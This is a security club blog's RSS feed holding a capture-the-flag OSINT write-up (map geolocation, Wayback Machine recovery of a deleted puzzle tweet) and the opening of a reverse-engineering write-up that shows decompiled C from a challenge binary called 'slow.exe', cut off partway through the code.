@@ -1,0 +1,547 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ctf | BKISC Blogs</title><link>https://blog.bkisc.com/bkisc.com-blog-page/tag/ctf/</link><atom:link href="https://blog.bkisc.com/bkisc.com-blog-page/tag/ctf/index.xml" rel="self" type="application/rss+xml"/><description>ctf</description><generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Mon, 16 Jan 2023 03:50:54 +0000</lastBuildDate><image><url>https://blog.bkisc.com/bkisc.com-blog-page/media/logo_huc55a0313517dd04bda48a4ace4db28bc_511389_300x300_fit_lanczos_3.png</url><title>ctf</title><link>https://blog.bkisc.com/bkisc.com-blog-page/tag/ctf/</link></image><item><title>idekCTF 2022 - Osint/Osint Crime Confusion 3: W as in Who</title><link>https://blog.bkisc.com/bkisc.com-blog-page/blog/fazect/idekctf2022_osintcrime3/</link><pubDate>Mon, 16 Jan 2023 03:50:54 +0000</pubDate><guid>https://blog.bkisc.com/bkisc.com-blog-page/blog/fazect/idekctf2022_osintcrime3/</guid><description>&lt;details class="toc-inpage d-print-none " open>
+&lt;summary class="font-weight-bold">Table of Contents&lt;/summary>
+&lt;nav id="TableOfContents">
+&lt;ul>
+&lt;li>&lt;a href="#introduction">Introduction&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#finding-the-location">Finding the location&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#getting-further-informations">Getting further informations&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#finding-the-deleted-tweet">Finding the deleted tweet&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#exploring-the-killers-github">Exploring the killer&amp;rsquo;s GitHub&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#conclusion">Conclusion&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/nav>
+&lt;/details>
+&lt;h2 id="introduction">Introduction&lt;/h2>
+&lt;p>&lt;strong>Given image:&lt;/strong> &lt;a href="https://drive.google.com/file/d/1sYKHJvmFAB0yjWCTEdp_ZL9g1Eh0G56x/view?usp=share_link" target="_blank" rel="noopener">Get it here!&lt;/a>&lt;/p>
+&lt;p>&lt;strong>Description:&lt;/strong> I feel the killer might be dangerous so I have some info to give you but I don&amp;rsquo;t want to disclose my email just like that. So find my review from the image below and send me an email asking for info. Be creative with the signature so I know its you. It is time to find Who is the killer.&lt;/p>
+&lt;p>&lt;strong>Category:&lt;/strong> OSINT&lt;/p>
+&lt;h2 id="finding-the-location">Finding the location&lt;/h2>
+&lt;p>From the given image, I managed to have found the location on &lt;strong>Google Maps&lt;/strong> at &lt;strong>41.154248, -8.682320&lt;/strong>.&lt;/p>
+&lt;img src="map.png" alt="Location" width="1000"/>
+&lt;p>Then in the comment section of the location, I got the mentioned secret email, labeled &lt;strong>&lt;a href="mailto:noodlesareramhackers@gmail.com">noodlesareramhackers@gmail.com&lt;/a>&lt;/strong>.&lt;/p>
+&lt;img src="comment.png" alt="Comment" width="1000"/>
+&lt;h2 id="getting-further-informations">Getting further informations&lt;/h2>
+&lt;p>I then sent an email to the email above, and got the next instructions.&lt;/p>
+&lt;img src="gmail.png" alt="Mail" width="1000"/>
+&lt;h2 id="finding-the-deleted-tweet">Finding the deleted tweet&lt;/h2>
+&lt;p>In the first challenge of the &lt;strong>Osint Crime Confusion set (W is for Where)&lt;/strong>, I found the instagram of a person named &lt;a href="https://www.instagram.com/hjthepainteng/" target="_blank" rel="noopener">Heather James&lt;/a>.&lt;/p>
+&lt;img src="ins.png" alt="Instagram" width="1000"/>
+&lt;p>Then from this person&amp;rsquo;s informations, I found the twitter account of &lt;a href="https://twitter.com/UThE_TS" target="_blank" rel="noopener">University of Dutch ThE of Topics in Science&lt;/a>.&lt;/p>
+&lt;img src="uni.png" alt="Twitter" width="1000"/>
+&lt;p>I then immediately knew we have to bring the account to the &lt;a href="https://web.archive.org" target="_blank" rel="noopener">Wayback Machine&lt;/a> to gain access to the deleted tweet. The email did mention about the tweet&amp;rsquo;s id &lt;strong>(1612383535549059076)&lt;/strong>, so we can paste this &lt;strong>URL&lt;/strong> into the &lt;strong>Wayback Machine&lt;/strong>: &lt;strong>&lt;a href="https://twitter.com/UThE_TS/status/1612383535549059076" target="_blank" rel="noopener">https://twitter.com/UThE_TS/status/1612383535549059076&lt;/a>&lt;/strong>&lt;/p>
+&lt;p>We successfully gained access to the deleted tweet!&lt;/p>
+&lt;img src="tweet.png" alt="Tweet" width="1000"/>
+&lt;h2 id="exploring-the-killers-github">Exploring the killer&amp;rsquo;s GitHub&lt;/h2>
+&lt;p>From the email, we also know that we should continue searching in &lt;strong>GitHub&lt;/strong>. Frankly enough, when I tried to search for &lt;strong>&amp;ldquo;potatoes eating camels&amp;rdquo;&lt;/strong> in GitHub, this showed up:&lt;/p>
+&lt;img src="git.png" alt="Git" width="1000"/>
+&lt;p>The descriptions imply that the person is &lt;strong>&amp;ldquo;still improving wiki&amp;rdquo;&lt;/strong>. We then head into the &lt;strong>wiki&lt;/strong> of this repository to find out the end of our journey.&lt;/p>
+&lt;img src="wiki.png" alt="Wiki" width="1000"/>
+&lt;img src="flag.png" alt="Flag" width="1000"/>
+&lt;p>Concatenate the first letters of the last &lt;strong>7 sentences&lt;/strong> of the poem, we have our flag for the challenge: &lt;strong>idek{JULIANA_APOSIDM723489}&lt;/strong>.&lt;/p>
+&lt;h2 id="conclusion">Conclusion&lt;/h2>
+&lt;p>A good OSINT challenge overall, consist of several general skills in the field of OSINT, such as &lt;strong>using Wayback Machine&lt;/strong> or &lt;strong>finding locations on Google Maps&lt;/strong>.&lt;/p></description></item><item><title>ISITDTU CTF 2022 Finals - Slow</title><link>https://blog.bkisc.com/bkisc.com-blog-page/blog/fazect/isitdtu-2022-slow/</link><pubDate>Fri, 13 Jan 2023 15:44:54 +0000</pubDate><guid>https://blog.bkisc.com/bkisc.com-blog-page/blog/fazect/isitdtu-2022-slow/</guid><description>&lt;details class="toc-inpage d-print-none " open>
+&lt;summary class="font-weight-bold">Table of Contents&lt;/summary>
+&lt;nav id="TableOfContents">
+&lt;ul>
+&lt;li>&lt;a href="#introduction">Introduction&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#static-analysis">Static Analysis&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#reaching-case-14">Reaching case 14&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#reaching-case-1">Reaching case 1&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#patch-the-binary">Patch the binary&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#result">Result&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/nav>
+&lt;/details>
+&lt;h2 id="introduction">Introduction&lt;/h2>
+&lt;p>&lt;strong>Given binary:&lt;/strong> &lt;a href="https://drive.google.com/file/d/1K2NjzRQadtL9CkbTINYDvrH7HRgSfDc1/view?usp=share_link" target="_blank" rel="noopener">Get it here!&lt;/a>&lt;/p>
+&lt;p>&lt;strong>Description:&lt;/strong> If you can make the program runs faster, you&amp;rsquo;ll get the flag!&lt;/p>
+&lt;p>&lt;strong>Category:&lt;/strong> Reverse Engineering&lt;/p>
+&lt;h2 id="static-analysis">Static Analysis&lt;/h2>
+&lt;p>The challenge provides us with a single binary, named &lt;strong>slow.exe&lt;/strong>. By using &lt;strong>IDA Pro&lt;/strong> or &lt;strong>Ghidra&lt;/strong> or any other kinds of decompiler, we will get the decompiled code.&lt;/p>
+&lt;p>Analyze the &lt;strong>main&lt;/strong> function, we claim that the program initiates an array whose size is &lt;strong>45&lt;/strong>, then modifies it through some more functions, as shown below.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="kr">__cdecl&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">envp&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">Block&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [esp+4h] [ebp-BCh]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">v5&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">45&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// [esp+8h] [ebp-B8h] BYREF
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v5&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v5&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">...&lt;/span> &lt;span class="n">snip&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v5&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">43&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">14&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v5&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">44&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">16&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Block&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nf">sub_401AC0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v5&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">38&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">sub_4013B0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Block&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">sub_401B40&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Block&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The function &lt;strong>sub_401AC0(v5, 38, 0)&lt;/strong> allocates dynamic memory using &lt;strong>malloc&lt;/strong> based on &lt;strong>v5&lt;/strong> then assigns it into variable &lt;strong>Block&lt;/strong>. That variable is then being passed into function &lt;strong>sub_4013B0(Block)&lt;/strong>, which will produce our flag once we have fixed it.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="kr">__cdecl&lt;/span> &lt;span class="nf">sub_4013B0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_DWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">a1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// eax
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">v2&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// eax
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">v3&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [esp+4h] [ebp-64h]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">...&lt;/span> &lt;span class="n">snip&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">v37&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [esp+64h] [ebp-4h]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">v38&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [esp+64h] [ebp-4h]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v6&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_DWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">a1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">a1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">v6&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="n">v6&lt;/span> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v22&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_DWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">a1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">a1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">--&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v26&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_DWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">a1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">a1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">--&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">sub_401110&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v26&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">v22&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v16&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">a1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">a1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">v16&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_DWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">a1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">v16&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">v2&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">...&lt;/span> &lt;span class="n">snip&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">...&lt;/span> &lt;span class="n">snip&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">...&lt;/span> &lt;span class="n">snip&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">...&lt;/span> &lt;span class="n">snip&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">7&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">...&lt;/span> &lt;span class="n">snip&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">...&lt;/span> &lt;span class="n">snip&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">9&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">...&lt;/span> &lt;span class="n">snip&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">...&lt;/span> &lt;span class="n">snip&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">11&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">...&lt;/span> &lt;span class="n">snip&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">12&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">...&lt;/span> &lt;span class="n">snip&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">13&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">...&lt;/span> &lt;span class="n">snip&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">14&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v38&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_DWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">a1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">a1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">--&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">sub_401040&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;RESULT: %d&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">v38&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">sub_401260&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v38&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">15&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">...&lt;/span> &lt;span class="n">snip&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">16&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">...&lt;/span> &lt;span class="n">snip&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">17&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">...&lt;/span> &lt;span class="n">snip&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">18&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">...&lt;/span> &lt;span class="n">snip&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">continue&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It is easy to observe that only case 1 and case 14 involve calling other functions.&lt;/p>
+&lt;p>To be more precise, if the program reaches &lt;strong>case 1&lt;/strong>, the function &lt;strong>sub_401110(v26, v22)&lt;/strong> will be called, and on the other hand, if the program reaches &lt;strong>case 14&lt;/strong>, the function &lt;strong>sub_401260(v38)&lt;/strong> will be called. We will talk more about these two functions in the next parts of this blog.&lt;/p>
+&lt;h2 id="reaching-case-14">Reaching case 14&lt;/h2>
+&lt;p>As stated earlier, the function &lt;strong>sub_401260(v38)&lt;/strong> will be called if the program reaches &lt;strong>case 14&lt;/strong>, which will be the last part of our code flow.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="kr">__cdecl&lt;/span> &lt;span class="nf">sub_401260&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="n">a1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">v2&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">256&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// [esp+10h] [ebp-224h] BYREF
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="n">Buffer&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [esp+110h] [ebp-124h] BYREF
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">_BYTE&lt;/span> &lt;span class="n">v4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// [esp+111h] [ebp-123h] BYREF
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="n">v5&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// [esp+210h] [ebp-24h] BYREF
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">qmemcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v5&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Áõ&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">);&lt;/span>
